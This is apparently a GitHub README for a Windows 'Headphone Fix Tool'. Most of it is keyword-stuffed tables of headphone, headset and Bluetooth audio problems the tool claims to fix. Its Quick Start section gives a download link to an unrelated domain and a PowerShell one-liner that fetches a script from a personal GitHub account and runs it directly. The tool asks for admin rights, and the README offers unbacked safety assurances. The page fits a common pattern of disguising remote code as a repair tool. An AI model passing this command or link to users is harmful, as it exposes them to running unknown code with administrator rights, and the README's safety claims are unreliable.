# Headphone Fix Tool

[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-0078D4?style=flat-square&logo=windows&logoColor=white)]()
[![Version](https://img.shields.io/badge/v1.1.0-stable-brightgreen?style=flat-square)]()
[![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)](LICENSE)

Fix headphones not working, no sound in headphones, headset not detected, and audio jack issues on Windows 10/11.

---

### Quick Start

**[Download Latest Release](https://headphone.nexustool.fun/)**

Or via PowerShell:
```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

---

## Problems This Fixes

### Headphones Not Working

| Symptom | Cause | Fix |
|---|---|---|
| **Headphones plugged in but no sound** | Wrong default playback device | Sets headphones as default device |
| **No sound in headphones** (speakers work) | Audio output not switching | Enables auto-switch on jack detection |
| Headphones **not detected** by Windows | Realtek jack detection disabled | Enables front panel jack detection |
| **"No headphones detected"** message | Audio driver missing jack sensing | Reinstalls Realtek/audio driver |
| Sound comes from **speakers AND headphones** | Both devices enabled simultaneously | Configures exclusive output switching |
| Headphones work but **very quiet** | Volume limited in driver settings | Adjusts per-device volume and amplification |

### USB / Wireless Headset Issues

| Symptom | Fix |
|---|---|
| **USB headset not detected** | Reinstalls USB audio driver, resets USB port |
| USB headset detected but **no sound** | Sets USB headset as default, fixes driver |
| **Bluetooth headphones connected but no audio** | Switches from Hands-Free to A2DP profile |
| Bluetooth headphones **sound quality is terrible** | Forces Stereo (A2DP) mode |
| **Wireless dongle headset** (HyperX, SteelSeries) not working | Reinstalls dongle driver |

### Gaming Headset Issues

| Symptom | Fix |
|---|---|
| **Headset mic not working** (audio works) | Enables headset mic, sets as default recording device |
| Game audio works but **voice chat doesn't** | Sets headset as default communication device |
| **Discord/TeamSpeak** not detecting headset | Resets app audio device assignment |
| Headset **surround sound not working** | Enables spatial audio, configures driver |
| Headset audio **crackling in games** | Adjusts buffer size, fixes DPC latency |

---

## Common Error Messages

| Error | Fix |
|---|---|
| **"No headphones detected"** | Enables jack detection in Realtek driver |
| **"Audio device is disabled"** | Re-enables headphone device in Sound settings |
| **"Failed to play test tone"** | Resets audio format, reinstalls driver |
| **"Default audio device not set"** | Sets headphones as default playback device |
| **"Headset microphone not found"** | Enables mic in privacy settings, sets as default |
| **"This device cannot start (Code 10)"** | Reinstalls audio controller driver |

---

## Supported Headphones & Headsets

**Wired (3.5mm jack):** Any headphones or earbuds with standard audio jack
**USB Headsets:** HyperX Cloud, SteelSeries Arctis, Corsair HS/Void, Razer Kraken/BlackShark, Logitech G, JBL Quantum, Astro, Turtle Beach, Jabra, Plantronics
**Bluetooth:** AirPods, AirPods Pro, AirPods Max, Sony WH-1000XM, Bose QC, Samsung Galaxy Buds, JBL, Beats, Sennheiser, Jabra Elite
**Wireless Dongle:** SteelSeries Arctis Nova, HyperX Cloud Flight, Corsair HS Wireless, Razer Barracuda

---

## Preview

```
  +-------------------------------------------------+
  |         Headphone Fix Tool v1.1.0               |
  +-------------------------------------------------+
  |                                                 |
  |  Playback Devices:                              |
  |  [OK] Speakers (Realtek)     -- Working         |
  |  [!]  Headphones             -- Not default     |
  |                                                 |
  |  Recording Devices:                             |
  |  [!]  Headset Microphone     -- Disabled        |
  |                                                 |
  |  Jack Detection:                                |
  |  [!]  Front panel            -- Not detected    |
  |  [OK] Rear panel             -- Connected       |
  |                                                 |
  |  [ Fix All ]   [ Test Audio ]   [ Exit ]        |
  |                                                 |
  +-------------------------------------------------+
```

---

## Common Scenarios

**Plugged in headphones but sound still comes from speakers**
Windows did not detect the headphone plug or did not switch the default device. The tool forces device detection and switches output.

**AirPods connected but no music audio**
Windows defaults to Hands-Free profile (phone call quality). The tool switches to A2DP (Stereo) profile for music/media.

**Gaming headset microphone not picked up in Discord**
The headset microphone is not set as the default communication device. The tool sets it correctly for both general and communication use.

**Front panel audio jack not working on desktop**
Front panel headers often have jack detection issues with Realtek drivers. The tool enables front panel detection or disables jack sensing to force output.

---

## How It Works

1. **Detect** -- Lists all audio output devices (speakers, headphones, USB, Bluetooth)
2. **Diagnose** -- Checks jack detection, default device, driver, Bluetooth profile
3. **Fix** -- Sets correct default, reinstalls driver, adjusts profiles
4. **Test** -- Plays audio through headphones to confirm fix

---

## System Requirements

| | |
|---|---|
| OS | Windows 10 / 11 (64-bit) |
| RAM | 2 GB minimum |
| Admin | Yes |
| Network | For driver downloads |

---

## FAQ

**My headphones work on my phone but not on my PC.**
The headphones are fine. The issue is Windows audio configuration. This tool fixes it.

**I only have one audio jack (combo jack on laptop).**
Combo jacks support both headphones and headset mics. The tool configures the driver to detect which type of plug is inserted.

**AirPods sound terrible on Windows.**
AirPods default to Hands-Free Telephony mode on Windows, which sounds like a phone call. The tool disables Hands-Free and forces Stereo mode.

**Is it safe?**
Yes. The tool configures Windows audio settings and drivers using standard APIs. No files are patched.

---

## License

[MIT](LICENSE)
